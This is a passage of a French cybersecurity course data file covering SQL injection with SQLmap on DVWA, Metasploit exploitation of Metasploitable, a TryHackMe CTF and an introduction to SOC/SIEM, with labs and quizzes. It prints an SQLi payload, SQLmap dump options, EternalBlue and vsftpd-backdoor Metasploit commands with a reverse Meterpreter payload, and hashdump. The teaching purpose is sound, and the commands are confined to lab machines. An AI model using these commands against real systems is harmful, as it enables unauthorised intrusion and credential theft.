      { heading: "Mesures de prévention", html: "<p>La prévention de l'injection SQL repose sur des principes de développement sécurisé, en cohérence avec l'OWASP Top 10 (A03 – Injection) :</p><ul><li><strong>Requêtes préparées</strong> (prepared statements) avec paramètres liés — la protection la plus robuste.</li><li><strong>Validation stricte des entrées</strong> (whitelist de caractères autorisés).</li><li><strong>Principe du moindre privilège</strong> pour le compte de base de données utilisé par l'application.</li><li><strong>ORM</strong> (Object-Relational Mapping) bien configuré, qui échappe nativement les entrées.</li><li><strong>Web Application Firewall (WAF)</strong> en défense complémentaire, jamais en remplacement du correctif applicatif.</li></ul>" }
    ],
    standards: ["OWASP Top 10 (2021) — A03: Injection", "CWE-89 — SQL Injection", "MITRE ATT&CK — Technique T1190 (Exploit Public-Facing Application)"],
    steps: [
      { text: "Comprendre en profondeur le principe et les variantes de l'injection SQL.", color: "blue" },
      { text: "Installer et vérifier SQLmap sur Kali Linux.", color: "orange" },
      { text: "Utiliser SQLmap pour détecter et exploiter une injection sur DVWA en laboratoire.", color: "blue" },
      { text: "Analyser les résultats : type d'injection, SGBD, données exposées.", color: "orange" },
      { text: "Proposer des mesures de prévention concrètes et argumentées.", color: "blue" },
      { text: "Livrable : compte-rendu d'exploitation contrôlée et de remédiation.", color: "red" }
    ],
    deliverable: "Un compte-rendu documentant, sur DVWA en environnement de laboratoire (niveau de sécurité low ou medium) : la détection de l'injection, son exploitation via SQLmap jusqu'au dump d'une table, et un plan de remédiation détaillé.",
    tp: {
      title: "TP S16 — Détection et exploitation contrôlée d'une injection SQL sur DVWA",
      objectif: "Détecter, exploiter de manière contrôlée et documenter une injection SQL sur une application volontairement vulnérable, puis proposer des mesures de correction concrètes.",
      duree: "120 minutes",
      materiel: ["VM Kali Linux avec SQLmap", "DVWA (Damn Vulnerable Web Application) déployée en local, niveau de sécurité « low »", "Navigateur avec session DVWA active"],
      consignes: [
        "Rappeler le cadre légal : l'exploitation ne s'effectue que sur l'instance locale de DVWA de l'apprenant, jamais sur une application tierce.",
        "Déployer DVWA en local, se connecter, régler le niveau de sécurité sur « low », puis accéder au module SQL Injection.",
        "Tester manuellement une injection simple dans le champ id (par exemple 1' OR '1'='1) pour observer le comportement de l'application avant automatisation.",
        "Récupérer le cookie de session PHPSESSID et lancer SQLmap avec l'option --batch pour confirmer automatiquement l'injection détectée.",
        "Énumérer progressivement avec SQLmap : bases de données disponibles (--dbs), tables de la base dvwa (--tables), puis dump de la table users (--dump).",
        "Documenter précisément le type d'injection identifié par SQLmap (booléenne, UNION-based, etc.) et le SGBD détecté.",
        "Rédiger une section de remédiation proposant au minimum deux mesures concrètes (requêtes préparées, validation des entrées) applicables au code vulnérable."
      ],
      livrable: "Un compte-rendu d'exploitation contrôlée incluant les commandes SQLmap utilisées, les résultats obtenus (bases, tables, extrait anonymisé du dump), et un plan de remédiation argumenté.",
      criteres: ["L'injection est correctement détectée et confirmée avant l'automatisation SQLmap.", "L'énumération progressive (bases > tables > dump) est menée et documentée avec les commandes exactes.", "Le type d'injection et le SGBD sont correctement identifiés et expliqués.", "Au moins deux mesures de prévention concrètes et pertinentes sont proposées."]
    },
    quiz: [
      { q: "Que réalise techniquement une injection SQL de type payload ' OR '1'='1 sur un champ de connexion vulnérable ?", options: ["Elle chiffre le mot de passe saisi", "Elle transforme la condition de la requête en une expression toujours vraie, pouvant contourner l'authentification", "Elle supprime automatiquement la base de données", "Elle bloque l'accès au serveur web"], correct: 1, explanation: "Le payload injecte une condition logique toujours vraie ('1'='1'), ce qui peut faire retourner un résultat positif à la requête d'authentification quelles que soient les valeurs réellement attendues." },
      { q: "Quelle est la mesure de prévention la plus robuste contre l'injection SQL au niveau du code applicatif ?", options: ["L'utilisation exclusive de HTTPS", "Les requêtes préparées (prepared statements) avec paramètres liés", "L'augmentation de la taille du mot de passe administrateur", "La désactivation du JavaScript côté client"], correct: 1, explanation: "Les requêtes préparées séparent structurellement le code SQL des données fournies par l'utilisateur, empêchant celles-ci d'être interprétées comme du code, quelle que soit leur contenu." },
      { q: "Dans SQLmap, quelle option permet d'exécuter l'outil sans demander de confirmations interactives ?", options: ["--dbs", "--dump", "--batch", "--tables"], correct: 2, explanation: "L'option --batch indique à SQLmap d'utiliser les réponses par défaut à chaque question, ce qui automatise entièrement l'exécution en environnement contrôlé." },
      { q: "Qu'est-ce qu'une injection SQL de type « blind » (aveugle) ?", options: ["Une injection qui affiche directement les données extraites dans la réponse HTTP", "Une injection où l'attaquant déduit l'information via des réponses booléennes ou des délais de réponse, sans affichage direct des données", "Une injection uniquement possible sur des bases de données chiffrées", "Une injection qui ne fonctionne que sur les formulaires de recherche"], correct: 1, explanation: "L'injection blind ne renvoie aucune donnée visible directement ; l'attaquant doit déduire des informations bit par bit en observant des différences de comportement (vrai/faux) ou de temps de réponse (time-based)." },
      { q: "À quelle catégorie de l'OWASP Top 10 (2021) appartient l'injection SQL ?", options: ["A01 – Broken Access Control", "A05 – Security Misconfiguration", "A03 – Injection", "A09 – Security Logging and Monitoring Failures"], correct: 2, explanation: "L'injection SQL appartient à la catégorie A03 – Injection de l'OWASP Top 10 (2021), qui regroupe l'ensemble des failles où des données non fiables sont interprétées comme du code par un interpréteur (SQL, OS, LDAP, etc.)." }
    ]
  },

  {
    id: "S17", week: 17, phase: 3,
    title: "Exploitation avec Metasploit",
    level: "avance",
    duration: "Semaine 17 · ~9h",
    intro: "Metasploit Framework est l'outil d'exploitation le plus utilisé au monde en test d'intrusion, structurant en un environnement unifié la recherche d'exploits, leur exécution, l'usage de payloads et la post-exploitation. Cette semaine, la plus sensible du programme, se pratique intégralement contre des machines volontairement vulnérables (Metasploitable) — jamais contre un système réel non autorisé.",
    objectives: [
      "Comprendre l'architecture de Metasploit Framework (exploits, payloads, encoders, auxiliary).",
      "Rechercher et sélectionner un exploit adapté à une vulnérabilité identifiée.",
      "Configurer et lancer un exploit contre une cible de laboratoire.",
      "Utiliser un payload (Meterpreter) pour établir un accès à distance.",
      "Réaliser des actions de post-exploitation de base et les documenter."
    ],
    definition: "Metasploit Framework est une plateforme open source (Rapid7) unifiant la recherche de vulnérabilités, le développement et l'exécution d'exploits, la génération de payloads et la post-exploitation. Il s'articule autour de msfconsole, l'interface en ligne de commande principale, et d'une base de modules classés en exploits, payloads, auxiliary, encoders et post.",
    analogy: { title: "🎯 Metasploit comme le simulateur de vol du pilote de chasse", text: "Un pilote de chasse ne s'entraîne jamais directement en situation réelle de combat : il utilise un simulateur reproduisant fidèlement les conditions, sans risque réel. Metasploit contre une machine Metasploitable joue ce rôle : reproduire fidèlement une exploitation réelle, dans un environnement totalement contrôlé et sans conséquence sur un tiers." },
    keyTerms: [
      { term: "Exploit", def: "Module Metasploit exploitant une vulnérabilité précise (souvent référencée par un CVE) pour obtenir une exécution de code sur la cible." },
      { term: "Payload", def: "Code exécuté sur la machine cible après le succès d'un exploit ; Meterpreter est le payload avancé le plus utilisé, offrant un shell interactif riche en mémoire." },
      { term: "Meterpreter", def: "Payload avancé de Metasploit s'exécutant en mémoire, offrant des commandes de post-exploitation (capture d'écran, keylogging, pivoting, extraction de hash) sans écrire sur le disque cible." },
      { term: "Post-exploitation", def: "Ensemble des actions menées après un accès initial réussi : élévation de privilèges, persistance, mouvement latéral, exfiltration — toutes documentées à des fins de rapport, jamais destructrices." }
    ],
    lesson: [
      { heading: "Rappel légal — la semaine la plus sensible", html: "<p>Cette semaine manipule des exploits réels capables de compromettre un système. Leur usage est <strong>strictement limité</strong> à des machines de laboratoire dédiées : Metasploitable 2/3, machines TryHackMe/HackTheBox explicitement autorisées pour l'exploitation. Utiliser Metasploit contre un système tiers sans autorisation écrite constitue un accès frauduleux à un système de traitement automatisé de données, sévèrement sanctionné dans la quasi-totalité des législations, y compris au Bénin.</p>" },
      { heading: "Architecture de Metasploit Framework", html: "<p>Metasploit s'articule autour de msfconsole et de cinq grandes familles de modules :</p><ul><li><strong>exploits/</strong> : code exploitant une vulnérabilité précise.</li><li><strong>payloads/</strong> : code exécuté après compromission (ex. Meterpreter, shell inverse).</li><li><strong>auxiliary/</strong> : modules de scan, de fuzzing, ou de force brute (sans exploitation directe).</li><li><strong>encoders/</strong> : encodage des payloads pour éviter certaines détections basiques (usage pédagogique uniquement en laboratoire).</li><li><strong>post/</strong> : modules de post-exploitation (extraction de hash, énumération système).</li></ul><pre><code># Lancer la console Metasploit\nmsfconsole\n\n# Afficher le nombre de modules chargés\nmsf6 > banner</code></pre>" },
      { heading: "Rechercher et sélectionner un exploit", html: "<p>La recherche d'un exploit part généralement des résultats de reconnaissance (S14) : un service et sa version identifiés par Nmap orientent la recherche.</p><pre><code># Rechercher un exploit lié à un service identifié en reconnaissance (exemple pédagogique : vsftpd 2.3.4 sur Metasploitable)\nmsf6 > search vsftpd\n\n# Sélectionner le module correspondant\nmsf6 > use exploit/unix/ftp/vsftpd_234_backdoor\n\n# Afficher les options requises par le module\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > options</code></pre><p>Cet exploit cible une backdoor volontairement présente dans la version 2.3.4 de vsftpd fournie avec Metasploitable — un cas d'école classique pour l'apprentissage.</p>" },
      { heading: "Configurer et lancer l'exploit avec un payload", html: "<p>Une fois le module sélectionné, il faut configurer la cible (RHOSTS), et éventuellement le payload.</p><pre><code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LPORT 4444\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > run\n\n# Pour un exploit nécessitant un payload Meterpreter (exemple générique) :\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(...) > set RHOSTS 192.168.56.102\nmsf6 exploit(...) > set LHOST 192.168.56.100\nmsf6 exploit(...) > exploit</code></pre><p>L'adresse <code>192.168.56.100</code> (LHOST) correspond à la machine Kali attaquante, toutes deux dans le même réseau Host-Only isolé.</p>" },
      { heading: "Post-exploitation avec Meterpreter", html: "<p>Une fois une session Meterpreter obtenue, plusieurs commandes permettent une reconnaissance et une documentation de l'accès obtenu, à des fins strictement pédagogiques et de rapport :</p><pre><code>meterpreter > sysinfo\nmeterpreter > getuid\nmeterpreter > screenshot\nmeterpreter > hashdump\nmeterpreter > background</code></pre><p>En contexte professionnel réel, ces actions doivent rester dans le périmètre défini par les Rules of Engagement, et toute donnée extraite (comme des hashs de mots de passe) est traitée avec la plus grande confidentialité et détruite après le rapport.</p>" },
      { heading: "Documenter un scénario d'exploitation", html: "<p>Un scénario d'exploitation professionnel retrace, étape par étape, la chaîne complète : vulnérabilité identifiée (avec CVE si applicable), exploit utilisé, payload déployé, preuve d'accès obtenue, actions de post-exploitation réalisées, et recommandations de remédiation — c'est cette structure qui constitue le livrable attendu.</p>" }
    ],
    standards: ["MITRE ATT&CK — Tactiques Initial Access (TA0001) et Execution (TA0002)", "CVE / CVSS — Common Vulnerabilities and Exposures / Common Vulnerability Scoring System", "PTES — Exploitation et Post-Exploitation"],
    steps: [
      { text: "Étudier l'architecture de Metasploit Framework (exploits, payloads, auxiliary, post).", color: "blue" },
      { text: "Rechercher un exploit adapté à partir des résultats de reconnaissance (S14).", color: "orange" },
      { text: "Configurer et lancer un exploit contre une VM Metasploitable en laboratoire.", color: "blue" },
      { text: "Déployer un payload Meterpreter et établir une session interactive.", color: "orange" },
      { text: "Réaliser des actions de post-exploitation documentées à but pédagogique.", color: "blue" },
      { text: "Livrable : scénario d'exploitation entièrement documenté.", color: "red" }
    ],
    deliverable: "Un scénario d'exploitation documenté (Markdown ou PDF) retraçant, contre une VM Metasploitable en laboratoire : reconnaissance préalable, sélection de l'exploit, configuration, obtention d'une session Meterpreter, actions de post-exploitation, et recommandations de remédiation.",
    tp: {
      title: "TP S17 — Chaîne d'exploitation complète sur Metasploitable en laboratoire",
      objectif: "Mener une chaîne d'exploitation complète, de la reconnaissance à la post-exploitation, contre une machine volontairement vulnérable, dans le strict respect du cadre légal du laboratoire.",
      duree: "120–150 minutes",
      materiel: ["VM Kali Linux avec Metasploit Framework", "VM Metasploitable 2, réseau Host-Only isolé", "Résultats de reconnaissance Nmap de la semaine S14 (ou nouveau scan)"],
      consignes: [
        "Rappeler explicitement le cadre légal : cette exploitation ne s'exécute que contre la VM Metasploitable personnelle, isolée en réseau Host-Only, jamais contre un système tiers.",
        "Relancer un scan Nmap de reconnaissance (-sV) sur la cible pour identifier au moins un service exploitable (ex. vsftpd 2.3.4, Samba, ou autre service Metasploitable connu).",
        "Dans msfconsole, rechercher (search) un exploit correspondant au service identifié et sélectionner le module avec use.",
        "Configurer les options requises (RHOSTS, RPORT, et LHOST/LPORT si un payload reverse est nécessaire) et vérifier la configuration avec options.",
        "Lancer l'exploit (run ou exploit) et confirmer l'obtention d'un accès (shell ou session Meterpreter).",
        "Exécuter au moins trois commandes de post-exploitation documentaires (sysinfo, getuid, et une commande d'énumération) sans action destructrice.",
        "Rédiger le scénario d'exploitation complet, de la reconnaissance à la recommandation de remédiation, avec captures d'écran à l'appui."
      ],
      livrable: "Un scénario d'exploitation documenté avec captures d'écran, incluant chaque commande utilisée, les résultats obtenus, et une section de remédiation.",
      criteres: ["La chaîne complète (reconnaissance, sélection d'exploit, exploitation, post-exploitation) est menée et documentée.", "Les commandes Metasploit sont correctement utilisées et expliquées.", "Aucune action destructrice ou hors périmètre n'est réalisée sur la VM cible.", "Le rapport final inclut des recommandations de remédiation cohérentes avec la vulnérabilité exploitée."]
    },
    quiz: [
      { q: "Dans l'architecture de Metasploit, quel type de module correspond au code exécuté sur la machine cible après le succès d'un exploit ?", options: ["auxiliary", "payload", "encoder", "post"], correct: 1, explanation: "Le payload est le code livré et exécuté sur la cible une fois l'exploit réussi ; Meterpreter en est l'exemple le plus avancé, offrant un shell interactif riche fonctionnant en mémoire." },
      { q: "Que signifie RHOSTS dans la configuration d'un module Metasploit ?", options: ["Le port local d'écoute de l'attaquant", "L'adresse IP de la machine attaquante (Kali)", "L'adresse IP ou la plage d'adresses de la machine cible", "Le nom du payload utilisé"], correct: 2, explanation: "RHOSTS désigne l'adresse ou la plage d'adresses de la ou des machines cibles visées par le module, à distinguer de LHOST qui désigne la machine de l'attaquant." },
      { q: "Pourquoi Meterpreter est-il considéré comme un payload avancé par rapport à un simple shell inversé ?", options: ["Parce qu'il s'exécute uniquement sur Linux", "Parce qu'il fonctionne en mémoire et offre des commandes de post-exploitation étendues (screenshot, hashdump, etc.)", "Parce qu'il ne nécessite aucune configuration réseau", "Parce qu'il chiffre automatiquement toute la base de données cible"], correct: 1, explanation: "Meterpreter s'exécute directement en mémoire (réduisant les traces disque) et propose un ensemble riche de commandes post-exploitation, contrairement à un shell inversé basique qui se limite à l'exécution de commandes système." },
      { q: "Dans quel cadre légal est-il acceptable de lancer un exploit Metasploit contre une machine ?", options: ["Dès lors que la machine est vulnérable et facilement accessible", "Uniquement contre une machine que l'on possède ou pour laquelle on dispose d'une autorisation écrite explicite", "Si l'exploit est disponible publiquement sur Metasploit", "Si aucune donnée n'est modifiée pendant le test"], correct: 1, explanation: "La disponibilité publique d'un exploit ou la simple présence d'une vulnérabilité ne rend jamais son exploitation légale sans autorisation écrite explicite du propriétaire du système." },
      { q: "Que représente un identifiant CVE associé à un exploit Metasploit ?", options: ["Le numéro de version de Metasploit Framework", "Un identifiant standardisé référençant une vulnérabilité publiquement connue", "Le score de sévérité de l'exploit sur 10", "Le nom du payload par défaut du module"], correct: 1, explanation: "CVE (Common Vulnerabilities and Exposures) est un système d'identification standardisé et public des vulnérabilités connues, souvent complété par un score CVSS qui en mesure la sévérité." }
    ]
  },

  {
    id: "S18", week: 18, phase: 3,
    title: "Projet de phase 3 — Mini CTF",
    level: "avance",
    duration: "Semaine 18 · ~10h",
    intro: "Cette semaine conclut la Phase 3 par une mise en pratique intégrée : un mini Capture The Flag (CTF) sur la plateforme légale TryHackMe. L'objectif n'est plus d'apprendre un outil isolé, mais de mobiliser toute la chaîne méthodologique acquise depuis S13 — reconnaissance, analyse web, injection, exploitation — face à des machines inconnues, dans un cadre 100% légal et encadré.",
    objectives: [
      "S'inscrire et se repérer sur une plateforme de CTF légale (TryHackMe).",
      "Résoudre méthodiquement au moins deux machines de niveau débutant/intermédiaire.",
      "Documenter chaque étape de résolution avec rigueur (méthodologie PTES).",
      "Participer activement à un débriefing collectif et comparer les approches.",
      "Rédiger un write-up de CTF complet et professionnel."
    ],
    definition: "Un CTF (Capture The Flag) est une épreuve de cybersécurité légale où le participant doit résoudre des défis techniques (souvent des machines virtuelles vulnérables) pour retrouver des « flags » (chaînes de caractères prouvant la compromission). TryHackMe est une plateforme en ligne proposant des environnements de laboratoire légaux, guidés ou libres, pour s'entraîner en toute légalité.",
    analogy: { title: "🏆 Le CTF comme l'examen pratique du permis de conduire", text: "Après des semaines de cours théoriques et d'exercices isolés (créneau, freinage, priorités), l'examen du permis de conduire met tout bout à bout dans un parcours réel supervisé. Le mini CTF de cette semaine joue exactement ce rôle : mobiliser Nmap, ZAP, SQLmap et Metasploit ensemble, sur des machines inconnues, dans un cadre légal et supervisé." },
    keyTerms: [
      { term: "Flag", def: "Chaîne de caractères unique (souvent au format flag{...} ou similaire) prouvant qu'une étape ou une machine a été compromise avec succès dans un CTF." },
      { term: "Write-up", def: "Document rédigé après résolution d'un défi ou d'une machine, détaillant méthodiquement chaque étape de la démarche, des outils utilisés et du raisonnement suivi." },
      { term: "Rabbit hole", def: "Piste d'investigation qui semble prometteuse mais qui s'avère être une impasse, consommant du temps sans mener à une compromission ; savoir l'identifier est une compétence clé du pentester." },
      { term: "Privilege escalation", def: "Étape consistant, après un accès initial limité, à obtenir des privilèges plus élevés (utilisateur standard vers administrateur/root) sur le système compromis." }
    ],
    lesson: [
      { heading: "Pourquoi TryHackMe pour ce projet final ?", html: "<p>TryHackMe est une plateforme légale et supervisée : chaque machine est hébergée dans une infrastructure dédiée, isolée, et son exploitation est explicitement autorisée par les conditions d'utilisation de la plateforme. C'est la garantie que l'intégralité des techniques enseignées depuis S13 peut être mobilisée sans aucune ambiguïté légale, contrairement à toute cible extérieure à la plateforme.</p>" },
      { heading: "S'inscrire et se repérer sur TryHackMe", html: "<p>L'inscription est gratuite pour l'essentiel des salles de niveau débutant/intermédiaire pertinentes pour ce projet.</p><pre><code># Étapes d'inscription (dans le navigateur, pas en ligne de commande) :\n# 1. Créer un compte sur tryhackme.com\n# 2. Rejoindre la salle recommandée par l'instructeur (ex. « Vulnversity » ou « Basic Pentesting »)\n# 3. Se connecter au VPN TryHackMe via OpenVPN depuis Kali :\nsudo openvpn votre-fichier-connexion.ovpn</code></pre><p>Une fois le VPN actif, la machine cible de la salle devient accessible depuis Kali, exactement comme une machine de laboratoire personnelle.</p>" },
      { heading: "Méthodologie de résolution d'une machine CTF", html: "<p>La résolution suit la même logique que les semaines précédentes, appliquée cette fois à une cible inconnue :</p><ul><li><strong>Reconnaissance</strong> : scan Nmap complet pour cartographier les services exposés.</li><li><strong>Énumération</strong> : approfondissement de chaque service (web, FTP, SMB...) avec les outils adaptés (ZAP, SQLmap si pertinent, énumération manuelle).</li><li><strong>Exploitation</strong> : recherche et utilisation d'un exploit (Metasploit ou manuel) pour obtenir un accès initial.</li><li><strong>Privilege escalation</strong> : élévation de privilèges pour atteindre le flag final (souvent situé dans un répertoire administrateur).</li></ul><pre><code># Exemple de démarrage de résolution (cible TryHackMe attribuée à l'apprenant)\nnmap -sV -A 10.10.x.x -oN recon_machine1.txt</code></pre>" },
      { heading: "Documenter chaque étape en temps réel", html: "<p>La rigueur de documentation est aussi importante que la résolution elle-même : chaque commande exécutée, chaque résultat obtenu et chaque hypothèse testée (même infructueuse) doivent être notés au fur et à mesure, pas reconstitués après coup. Cette discipline reproduit exactement les exigences d'un rapport de pentest professionnel.</p>" },
      { heading: "Le débriefing collectif", html: "<p>Après résolution individuelle ou en petit groupe, un débriefing collectif permet de comparer les cheminements : plusieurs voies mènent souvent au même flag, et confronter les approches (outils choisis, ordre des étapes, rabbit holes rencontrés) est l'un des apprentissages les plus formateurs du CTF — une pratique courante dans les équipes de pentest professionnelles (peer review).</p>" },
      { heading: "Rédiger un write-up professionnel", html: "<p>Un write-up de qualité professionnelle suit une structure claire : résumé de la machine, reconnaissance (résultats Nmap), énumération détaillée, chaîne d'exploitation pas à pas (avec commandes et captures), élévation de privilèges, flags obtenus, et enfin les leçons retenues. C'est ce document qui constitue le livrable final de toute la Phase 3.</p>" }
    ],
    standards: ["PTES — Méthodologie complète (Pre-engagement à Reporting)", "MITRE ATT&CK — Tactiques Reconnaissance, Initial Access, Execution, Privilege Escalation", "EC-Council CEH / eJPT — Méthodologie d'examen pratique"],
    steps: [
      { text: "S'inscrire sur TryHackMe et configurer l'accès VPN depuis Kali.", color: "blue" },
      { text: "Résoudre méthodiquement une première machine de niveau débutant.", color: "orange" },
      { text: "Résoudre une deuxième machine en mobilisant reconnaissance, exploitation et élévation de privilèges.", color: "blue" },
      { text: "Documenter chaque étape en temps réel (commandes, résultats, hypothèses).", color: "orange" },
      { text: "Participer au débriefing collectif et comparer les approches.", color: "blue" },
      { text: "Livrable : write-up de CTF complet et professionnel.", color: "red" }
    ],
    deliverable: "Un write-up de CTF professionnel (Markdown ou PDF) couvrant la résolution complète de deux machines TryHackMe, structuré en reconnaissance, énumération, exploitation, élévation de privilèges et leçons retenues, clôturant la Phase 3 du programme HACKINÉTIQUE.",
    tp: {
      title: "TP S18 — Mini CTF encadré sur TryHackMe",
      objectif: "Mobiliser l'ensemble des compétences acquises en Phase 3 (reconnaissance, analyse web, injection, exploitation) pour résoudre deux machines CTF légales et en rédiger un write-up professionnel.",
      duree: "3 à 5 heures (réparties sur la semaine)",
      materiel: ["VM Kali Linux complète (Nmap, ZAP, SQLmap, Metasploit)", "Compte TryHackMe et accès VPN configuré", "Deux machines TryHackMe de niveau débutant/intermédiaire assignées par l'instructeur"],
      consignes: [
        "Rappeler le cadre légal : seules les machines officiellement hébergées par TryHackMe et accessibles via le VPN de la plateforme peuvent être ciblées ; aucune autre cible n'est autorisée.",
        "Créer un compte TryHackMe, rejoindre la salle assignée, et établir la connexion VPN depuis la VM Kali.",
        "Sur la première machine, effectuer une reconnaissance Nmap complète, énumérer les services exposés, puis progresser vers l'accès initial et le premier flag (user flag).",
        "Poursuivre par l'élévation de privilèges jusqu'à l'obtention du flag administrateur (root/system flag), en documentant chaque tentative, y compris les échecs.",
        "Répéter la démarche sur une deuxième machine de complexité comparable ou légèrement supérieure.",
        "Participer au débriefing collectif organisé par l'instructeur : présenter sa méthode, comparer avec les autres apprenants, identifier les rabbit holes rencontrés.",
        "Rédiger le write-up final structuré (résumé, reconnaissance, énumération, exploitation, privilege escalation, flags, leçons retenues) pour les deux machines."
      ],
      livrable: "Un write-up de CTF complet couvrant les deux machines résolues, avec captures d'écran des flags obtenus, commandes utilisées et section de leçons retenues.",
      criteres: ["Les deux machines sont résolues (ou la démarche est documentée avec justification en cas de blocage partiel).", "Chaque étape (reconnaissance, énumération, exploitation, élévation de privilèges) est clairement documentée avec preuves.", "Le write-up respecte une structure professionnelle claire et lisible.", "L'apprenant a activement participé au débriefing collectif et intègre les retours dans sa réflexion finale."]
    },
    quiz: [
      { q: "Pourquoi TryHackMe constitue-t-il un cadre légal approprié pour ce projet final de Phase 3 ?", options: ["Parce que la plateforme est gratuite", "Parce que les machines sont hébergées et explicitement mises à disposition par la plateforme pour l'entraînement légal", "Parce qu'aucune règle n'encadre son utilisation", "Parce qu'elle ne nécessite pas de VPN"], correct: 1, explanation: "TryHackMe héberge des machines volontairement vulnérables dans une infrastructure dédiée, dont l'exploitation par les utilisateurs inscrits est explicitement autorisée par les conditions d'utilisation de la plateforme." },
      { q: "Qu'est-ce qu'un « rabbit hole » dans le contexte d'un CTF ?", options: ["Le flag final d'une machine", "Une piste d'investigation qui semble prometteuse mais s'avère être une impasse", "Un type de payload Metasploit", "Le nom d'une catégorie de vulnérabilité OWASP"], correct: 1, explanation: "Un rabbit hole désigne une piste de recherche qui consomme du temps sans mener à une avancée réelle vers la compromission ; savoir l'identifier rapidement est une compétence essentielle du pentester." },
      { q: "Dans la méthodologie de résolution d'une machine CTF, que vient faire l'étape de « privilege escalation » ?", options: ["Elle scanne les ports ouverts de la machine", "Elle élève les privilèges d'un accès initial limité vers un accès administrateur/root", "Elle chiffre les communications avec la cible", "Elle génère automatiquement le write-up final"], correct: 1, explanation: "La privilege escalation intervient après un accès initial (souvent avec des droits limités) et vise à obtenir des privilèges plus élevés, généralement nécessaires pour atteindre le flag administrateur final." },
      { q: "Quel est l'intérêt principal du débriefing collectif après la résolution des machines CTF ?", options: ["Il permet d'obtenir automatiquement plus de flags", "Il permet de comparer les approches, identifier des méthodes alternatives et partager les rabbit holes rencontrés", "Il remplace la rédaction du write-up", "Il est purement administratif et sans valeur pédagogique"], correct: 1, explanation: "Le débriefing collectif reproduit une pratique professionnelle courante (peer review) : confronter différentes méthodologies pour un même objectif enrichit considérablement l'apprentissage individuel." },
      { q: "Quelle section ne doit JAMAIS manquer dans un write-up de CTF professionnel ?", options: ["Une liste des autres apprenants du groupe", "La reconnaissance initiale (résultats Nmap) et la chaîne d'exploitation détaillée étape par étape", "Le prix d'achat de la licence TryHackMe", "Une critique du design de l'interface TryHackMe"], correct: 1, explanation: "Un write-up professionnel doit permettre à un tiers de reproduire intégralement la démarche : il documente donc systématiquement la reconnaissance et chaque étape de la chaîne d'exploitation jusqu'au flag final." }
    ]
  }
];

// PHASE 4 — DÉFENSE & PROFESSIONNALISATION (S19 à S24)
const PHASE4 = [
{
  id: "S19", week: 19, phase: 4,
  title: "Le SOC et le SIEM",
  level: "expert",
  duration: "Semaine 19 · ~10h",
  intro: "Après avoir appris à attaquer, place à la défense structurée. Le Security Operations Center (SOC) est le cœur battant de toute organisation mature en cybersécurité : une équipe et des outils qui surveillent, détectent et réagissent 24h/24. Cette semaine installe votre premier SIEM et pose les bases du métier d'analyste SOC.",
  objectives: [
    "Expliquer le rôle, l'organisation et les niveaux d'un SOC (analystes N1/N2/N3).",
    "Installer et configurer une stack SIEM (Wazuh ou ELK) sur une infrastructure de test.",
    "Déployer des collecteurs de logs (agents Wazuh, Filebeat) sur plusieurs sources.",
    "Construire des tableaux de bord de supervision exploitables.",
    "Définir des règles d'alerte pertinentes alignées sur des cas d'usage de détection réels."
  ],
  definition: "Un SOC (Security Operations Center) est l'entité opérationnelle chargée de la surveillance continue, de la détection et de la première réponse aux incidents de sécurité d'une organisation. Son outil central est le SIEM (Security Information and Event Management), qui centralise, corrèle et met en alerte à partir des journaux collectés sur l'ensemble du système d'information. Cette semaine couvre l'installation d'une stack Wazuh (ou ELK — Elasticsearch, Logstash, Kibana), la configuration des collecteurs de logs, la construction de tableaux de bord et la mise en place d'alertes.",
  analogy: { title: "🚨 Le SOC comme tour de contrôle aéroportuaire", text: "Un aiguilleur du ciel ne regarde pas un seul avion : il surveille en permanence des dizaines de vols sur un radar centralisé et déclenche une alerte dès qu'une trajectoire sort de la norme. Le SIEM joue exactement ce rôle pour le système d'information : il agrège tous les « vols » (connexions, processus, fichiers) sur un seul écran radar." },
  keyTerms: [
    { term: "SOC", def: "Security Operations Center : équipe et infrastructure dédiées à la surveillance continue et à la réponse aux incidents." },
    { term: "SIEM", def: "Security Information and Event Management : plateforme qui collecte, corrèle et met en alerte à partir des journaux (logs) du système d'information." },
    { term: "Agent de collecte", def: "Programme léger installé sur une machine surveillée qui transmet ses journaux au serveur SIEM." },
    { term: "Corrélation", def: "Analyse croisée de plusieurs événements distincts pour détecter un comportement suspect qu'un seul log ne révélerait pas." },
    { term: "MTTD / MTTR", def: "Mean Time To Detect / Mean Time To Respond : indicateurs clés de performance d'un SOC mesurant la rapidité de détection et de réponse." }
  ],
  lesson: [
    { heading: "Le rôle d'un SOC dans l'organisation", html: "<p>Un SOC assure une surveillance continue (idéalement 24h/24, 7j/7) des systèmes, réseaux et applications. Il s'organise généralement en niveaux :</p><ul><li><strong>Analyste N1</strong> — tri des alertes, premier diagnostic, escalade.</li><li><strong>Analyste N2</strong> — investigation approfondie, corrélation d'événements, qualification de l'incident.</li><li><strong>Analyste N3 / Threat Hunter</strong> — recherche proactive de menaces, réponse aux incidents complexes, amélioration des règles de détection.</li></ul><p>Ces activités relèvent directement des fonctions <strong>Detect</strong> et <strong>Respond</strong> du NIST Cybersecurity Framework.</p>" },
    { heading: "Architecture d'une stack SIEM", html: "<p>Deux stacks open source dominent le marché de la formation et des PME :</p><ul><li><strong>Wazuh</strong> — plateforme XDR/SIEM tout-en-un intégrant collecte, analyse, détection d'intrusion hôte (HIDS) et conformité.</li><li><strong>ELK Stack</strong> (Elasticsearch, Logstash, Kibana) — brique par brique : Logstash collecte et transforme, Elasticsearch indexe et recherche, Kibana visualise.</li></ul><p>Wazuh s'appuie d'ailleurs sur Elasticsearch/OpenSearch et Kibana en arrière-plan, ce qui en fait un excellent point d'entrée pour découvrir les deux mondes.</p>" },
    { heading: "Installation et configuration de Wazuh", html: "<p>Sur une VM Ubuntu Server dédiée (4 Go de RAM minimum), l'installation du manager Wazuh se fait via le script officiel :</p><pre><code>curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh\nsudo bash wazuh-install.sh -a\n# Récupérer le mot de passe admin généré\nsudo tar -O -xvf wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt</code></pre><p>L'interface Wazuh Dashboard est ensuite accessible en HTTPS sur le port 443 du manager.</p>" },
